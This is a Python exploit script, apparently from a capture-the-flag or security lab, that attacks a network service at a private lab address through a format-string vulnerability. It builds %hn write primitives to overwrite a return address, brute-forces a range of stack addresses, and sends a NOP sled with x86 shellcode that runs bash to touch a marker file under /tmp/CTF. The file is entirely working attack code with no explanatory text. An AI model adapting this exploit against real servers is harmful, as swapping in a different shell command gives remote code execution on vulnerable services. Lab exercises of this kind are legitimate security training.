#!/usr/bin/python3

import sys
import socket
import decimal 

def send_to_server(data):
    host = "10.1.150.194"
    port = 9089                   
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.sendall(data)
    s.close()

shellcode= (
# Push '/bin////bash' into stack
    "\x31\xc0"                              # xorl %eax,%eax
    "\x50"                                  # pushl %eax
    "\x68""bash"                            # pushl "bash"
    "\x68""////"                            # pushl "////"
    "\x68""/bin"                            # pushl "/bin"
    "\x89\xe3"                              # movl %esp, %ebx

    # Push '-ccc' into stack
    "\x31\xc0"                              # xorl %eax,%eax
    "\x50"                                  # pushl %eax
    "\x68""-ccc"                            # pushl "-ccc"
    "\x89\xe0"                              # movl %esp, %eax

    "\x31\xd2"				    # xorl %edx,%edx
    "\x52"				    # pushl %edx
    "\x68""    "
    "\x68""png "
    "\x68""ker."			    
    "\x68""Brea"			    
    "\x68""Rule"			    
    "\x68""////"			    # pushl "////"
    "\x68""/CTF"			    # pushl "/CTF"
    "\x68""/tmp"			    # pushl "/tmp"
    "\x68""ch  "			    # pushl "ch  "
    "\x68""/tou"			    # pushl "/tou"
    "\x68""/bin"			    # pushl "/bin"
    "\x68""/usr"			    # pushl "/usr"
    "\x89\xe2"				    # movl %esp,%edx

    # Construct the argv[] array
    "\x31\xc9"                              # xorl %ecx,%ecx
    "\x51"                                  # pushl %ecx
    "\x52"                                  # pushl %edx
    "\x50"                                  # pushl %eax
    "\x53"                                  # pushl %ebx
    "\x89\xe1"                              # movl %esp,%ecx

    # Set edx to 0
    "\x31\xd2"                              # xorl %edx,%edx

    # Invoke the system call
    "\x31\xc0"                              # xorl %eax,%eax
    "\xb0\x0b"                              # movb $0x0b,%al
    "\xcd\x80"                              # int $0x80
).encode('latin-1')

def HexToByte( hexStr ):
    bytes = []

    hexStr = ''.join( hexStr.split(" ") )

    bytes.append( chr( int (hexStr[8:], 16 ) ) )
    bytes.append( chr( int (hexStr[6:8], 16 ) ) )
    bytes.append( chr( int (hexStr[4:6], 16 ) ) )
    bytes.append( chr( int (hexStr[2:4], 16 ) ) )

    return ''.join( bytes )

def calc_number(old,new):
	if old  < new:
		return new - old 
	else:	
		return 65536-old + new

ra_s = "0xbfffc730"
ra_e = "0xbfffc7ff"
s_d = int(ra_s,16)
e_d = int(ra_e,16)

maliciousAddr_l = "0xdfd0"
maliciousAddr_h = "0xbfff"

distance=799

mid_1 = "@@@@"
mid_3 ="" 
for i in range(distance-1):
	mid_3+= "%.8x"

old = 8 * (distance-1) + 12
new1 = calc_number(old, int(maliciousAddr_h,16))
new2 = calc_number(int(maliciousAddr_h,16),int(maliciousAddr_l,16))

tail_1 = "%." + str(new1) + "x%hn"
tail_2 = "%." + str(new2) + "x%hn"

print(new1)

while(s_d <= e_d):
	print(hex(s_d))
	header = HexToByte(hex(s_d))
	mid_2 = HexToByte(hex(s_d+2))
	
	format_string=(mid_2+mid_1+header+mid_3+tail_1+tail_2).encode('latin-1')
	#print(format_string)
	# Put format string at beginning
	content = bytearray(0x90 for i in range(5000))
	content[0:len(format_string)] = format_string
	
	# Put the shellcode at the end
	start = 5000 - len(shellcode) 
	content[start:] = shellcode 
	send_to_server(content)
	s_d +=4
